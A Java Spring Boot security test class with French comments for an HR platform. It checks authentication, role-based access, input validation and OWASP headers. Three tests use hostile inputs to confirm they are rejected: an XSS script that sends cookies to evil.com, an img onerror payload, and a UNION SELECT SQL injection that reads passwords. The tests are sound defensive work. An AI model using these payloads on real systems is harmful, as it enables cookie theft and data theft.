package com.nexgenai.security;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.nexgenai.service.CodeExecutionService;
import com.nexgenai.service.EmailService;

import org.junit.jupiter.api.*;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.http.MediaType;
import org.springframework.security.test.context.support.WithMockUser;
import org.springframework.security.test.web.servlet.setup.SecurityMockMvcConfigurers;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.web.context.WebApplicationContext;

import java.util.List;
import java.util.Map;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * Tests de sécurité Sprint 2 — Authentification · RBAC · Injection · Validation
 *
 * Couverture :
 *   Groupe 1 — Accès non authentifié (401)
 *     TC-SEC2-01  GET  /job-tests sans token          → 401
 *     TC-SEC2-02  POST /job-tests sans token          → 401
 *     TC-SEC2-03  GET  /hr/jobs/x/candidates sans token → 401
 *     TC-SEC2-04  POST /hr/jobs/x/candidates/y/decision sans token → 401
 *     TC-SEC2-05  JWT falsifié → GET /job-tests       → 401
 *
 *   Groupe 2 — Mauvais rôle (403 Forbidden)
 *     TC-SEC2-06  CANDIDATE → POST /job-tests (créer test) → 403
 *     TC-SEC2-07  CANDIDATE → PATCH /job-tests/{id}/activate → 403
 *     TC-SEC2-08  CANDIDATE → DELETE /job-tests/{id} → 403
 *     TC-SEC2-09  CANDIDATE → GET /hr/jobs/{id}/candidates → 403
 *     TC-SEC2-10  CANDIDATE → POST /hr/jobs/{id}/candidates/{id}/decision → 403
 *     TC-SEC2-11  CANDIDATE → POST /job-tests/{id}/themes → 403
 *     TC-SEC2-12  CANDIDATE → PATCH /job-tests/{id}/archive → 403
 *
 *   Groupe 3 — Validation / Injection (400)
 *     TC-SEC2-13  XSS dans le nom du thème (HR role)         → 400
 *     TC-SEC2-14  XSS dans la note de décision (HR role)     → 400
 *     TC-SEC2-15  SQL injection dans le titre du test (HR)   → 400
 *
 *   Groupe 4 — Logique métier sécurisée
 *     TC-SEC2-16  CANDIDATE → GET /job-tests (lecture) → 200 (lecture autorisée)
 *     TC-SEC2-17  Tous les headers OWASP présents sur GET /job-tests → 200
 */
@SpringBootTest
@ActiveProfiles("test")
@DisplayName("Sprint 2 — Security Tests (Auth · RBAC · XSS · SQLi)")
@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
@TestInstance(TestInstance.Lifecycle.PER_CLASS)
class Sprint2SecurityTest {

    @Autowired private WebApplicationContext wac;
    @Autowired private ObjectMapper          objectMapper;

    @MockBean private EmailService         emailService;
    @MockBean private CodeExecutionService codeExecutionService;

    private MockMvc mockMvc;
    private String  candidateToken;

    private static final String TEST_JOB_ID       = "non-existent-job-000";
    private static final String TEST_CANDIDATE_ID = "non-existent-cand-000";
    private static final String TEST_TEST_ID      = "non-existent-test-000";

    // ── Setup ─────────────────────────────────────────────────────────────────

    @BeforeAll
    void setup() throws Exception {
        mockMvc = MockMvcBuilders.webAppContextSetup(wac)
            .apply(SecurityMockMvcConfigurers.springSecurity())
            .build();

        // Register a CANDIDATE test account to get a valid JWT
        Map<String, String> reg = Map.of(
            "firstName",       "Sec2",
            "lastName",        "Tester",
            "email",           "sec2.test@nexgenai.com",
            "password",        "Sec2Test@123!",
            "confirmPassword", "Sec2Test@123!"
        );
        MvcResult r = mockMvc.perform(post("/auth/register")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(reg)))
                .andReturn();

        String body = r.getResponse().getContentAsString();
        var tree = objectMapper.readTree(body);
        if (tree.has("token")) {
            candidateToken = tree.get("token").asText();
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    // Groupe 1 — Accès non authentifié → 401
    // ══════════════════════════════════════════════════════════════════════════

    @Test
    @Order(1)
    @DisplayName("TC-SEC2-01 : GET /job-tests sans token → 401 Unauthorized")
    void noAuth_getJobTests_returns401() throws Exception {
        mockMvc.perform(get("/job-tests"))
               .andExpect(status().isUnauthorized());
    }

    @Test
    @Order(2)
    @DisplayName("TC-SEC2-02 : POST /job-tests sans token → 401 Unauthorized")
    void noAuth_createJobTest_returns401() throws Exception {
        mockMvc.perform(post("/job-tests")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"name\":\"Test\"}"))
               .andExpect(status().isUnauthorized());
    }

    @Test
    @Order(3)
    @DisplayName("TC-SEC2-03 : GET /hr/jobs/{id}/candidates sans token → 401 Unauthorized")
    void noAuth_getCandidatesForJob_returns401() throws Exception {
        mockMvc.perform(get("/hr/jobs/" + TEST_JOB_ID + "/candidates"))
               .andExpect(status().isUnauthorized());
    }

    @Test
    @Order(4)
    @DisplayName("TC-SEC2-04 : POST /hr/jobs/{id}/candidates/{id}/decision sans token → 401 Unauthorized")
    void noAuth_makeDecision_returns401() throws Exception {
        Map<String, String> body = Map.of("decision", "ACCEPTED");
        mockMvc.perform(post("/hr/jobs/" + TEST_JOB_ID + "/candidates/" + TEST_CANDIDATE_ID + "/decision")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(body)))
               .andExpect(status().isUnauthorized());
    }

    @Test
    @Order(5)
    @DisplayName("TC-SEC2-05 : JWT falsifié → GET /job-tests → 401 Unauthorized")
    void forgedJwt_getJobTests_returns401() throws Exception {
        mockMvc.perform(get("/job-tests")
                .header("Authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.FORGED_PAYLOAD.bad_signature"))
               .andExpect(status().isUnauthorized());
    }

    // ══════════════════════════════════════════════════════════════════════════
    // Groupe 2 — Mauvais rôle → 403 Forbidden
    // ══════════════════════════════════════════════════════════════════════════

    @Test
    @Order(6)
    @DisplayName("TC-SEC2-06 : CANDIDATE → POST /job-tests (créer test) → 403 Forbidden")
    void candidate_createJobTest_returns403() throws Exception {
        mockMvc.perform(post("/job-tests")
                .header("Authorization", "Bearer " + candidateToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"name\":\"Mon test\",\"description\":\"test\"}"))
               .andExpect(status().isForbidden());
    }

    @Test
    @Order(7)
    @DisplayName("TC-SEC2-07 : CANDIDATE → PATCH /job-tests/{id}/activate → 403 Forbidden")
    void candidate_activateTest_returns403() throws Exception {
        mockMvc.perform(patch("/job-tests/" + TEST_TEST_ID + "/activate")
                .header("Authorization", "Bearer " + candidateToken))
               .andExpect(status().isForbidden());
    }

    @Test
    @Order(8)
    @DisplayName("TC-SEC2-08 : CANDIDATE → DELETE /job-tests/{id} → 403 Forbidden")
    void candidate_deleteTest_returns403() throws Exception {
        mockMvc.perform(delete("/job-tests/" + TEST_TEST_ID)
                .header("Authorization", "Bearer " + candidateToken))
               .andExpect(status().isForbidden());
    }

    @Test
    @Order(9)
    @DisplayName("TC-SEC2-09 : CANDIDATE → GET /hr/jobs/{id}/candidates → 403 Forbidden")
    void candidate_accessHrCandidateList_returns403() throws Exception {
        mockMvc.perform(get("/hr/jobs/" + TEST_JOB_ID + "/candidates")
                .header("Authorization", "Bearer " + candidateToken))
               .andExpect(status().isForbidden());
    }

    @Test
    @Order(10)
    @DisplayName("TC-SEC2-10 : CANDIDATE → POST /hr/jobs/{id}/candidates/{id}/decision → 403 Forbidden")
    void candidate_makeHrDecision_returns403() throws Exception {
        Map<String, String> body = Map.of("decision", "ACCEPTED", "note", "Bon profil");
        mockMvc.perform(post("/hr/jobs/" + TEST_JOB_ID + "/candidates/" + TEST_CANDIDATE_ID + "/decision")
                .header("Authorization", "Bearer " + candidateToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(body)))
               .andExpect(status().isForbidden());
    }

    @Test
    @Order(11)
    @DisplayName("TC-SEC2-11 : CANDIDATE → POST /job-tests/{id}/themes → 403 Forbidden")
    void candidate_addThemeToTest_returns403() throws Exception {
        Map<String, String> body = Map.of("name", "Ouverture", "category", "PERSONALITY");
        mockMvc.perform(post("/job-tests/" + TEST_TEST_ID + "/themes")
                .header("Authorization", "Bearer " + candidateToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(body)))
               .andExpect(status().isForbidden());
    }

    @Test
    @Order(12)
    @DisplayName("TC-SEC2-12 : CANDIDATE → PATCH /job-tests/{id}/archive → 403 Forbidden")
    void candidate_archiveTest_returns403() throws Exception {
        mockMvc.perform(patch("/job-tests/" + TEST_TEST_ID + "/archive")
                .header("Authorization", "Bearer " + candidateToken))
               .andExpect(status().isForbidden());
    }

    // ══════════════════════════════════════════════════════════════════════════
    // Groupe 3 — Validation entrées / Injection → 400
    // ══════════════════════════════════════════════════════════════════════════

    @Test
    @Order(13)
    @DisplayName("TC-SEC2-13 : XSS dans le nom du thème → 400 (SecurityAuditFilter ou @Valid)")
    @WithMockUser(roles = "HR")
    void xss_themeNameWithScriptTag_returns400() throws Exception {
        Map<String, String> body = Map.of(
            "name",     "<script>fetch('https://evil.com?c='+document.cookie)</script>",
            "category", "PERSONALITY"
        );
        mockMvc.perform(post("/job-tests/" + TEST_TEST_ID + "/themes")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(body)))
               .andExpect(status().isBadRequest());
    }

    @Test
    @Order(14)
    @DisplayName("TC-SEC2-14 : XSS dans la note de décision → 400 (SecurityAuditFilter ou @Valid)")
    @WithMockUser(roles = "HR")
    void xss_decisionNoteWithScriptTag_returns400() throws Exception {
        Map<String, String> body = Map.of(
            "decision", "REJECTED",
            "note",     "<img src=x onerror=alert(document.domain)>"
        );
        mockMvc.perform(post("/hr/jobs/" + TEST_JOB_ID + "/candidates/" + TEST_CANDIDATE_ID + "/decision")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(body)))
               .andExpect(status().isBadRequest());
    }

    @Test
    @Order(15)
    @DisplayName("TC-SEC2-15 : SQL injection dans le titre du test → 400 (SecurityAuditFilter)")
    @WithMockUser(roles = "HR")
    void sqli_testTitleWithUnionSelect_returns400() throws Exception {
        mockMvc.perform(get("/job-tests")
                .param("name", "' UNION SELECT id,password FROM users--"))
               .andExpect(status().isBadRequest());
    }

    // ══════════════════════════════════════════════════════════════════════════
    // Groupe 4 — Logique métier sécurisée
    // ══════════════════════════════════════════════════════════════════════════

    @Test
    @Order(16)
    @DisplayName("TC-SEC2-16 : CANDIDATE → GET /job-tests (lecture) → 200 (lecture ouverte à tout utilisateur authentifié)")
    void candidate_readJobTests_returns200() throws Exception {
        mockMvc.perform(get("/job-tests")
                .header("Authorization", "Bearer " + candidateToken))
               .andExpect(status().isOk());
    }

    @Test
    @Order(17)
    @DisplayName("TC-SEC2-17 : Headers OWASP présents sur GET /job-tests")
    void securityHeaders_presentOnJobTestsEndpoint() throws Exception {
        var result = mockMvc.perform(get("/job-tests")
                .header("Authorization", "Bearer " + candidateToken))
               .andExpect(status().isOk())
               .andReturn();

        var resp = result.getResponse();
        Assertions.assertAll("OWASP Headers sur /job-tests",
            () -> Assertions.assertNotNull(resp.getHeader("X-Content-Type-Options"), "X-Content-Type-Options manquant"),
            () -> Assertions.assertNotNull(resp.getHeader("X-Frame-Options"),        "X-Frame-Options manquant"),
            () -> Assertions.assertNotNull(resp.getHeader("Content-Security-Policy"),"CSP manquant"),
            () -> Assertions.assertNotNull(resp.getHeader("Referrer-Policy"),        "Referrer-Policy manquant")
        );
    }
}
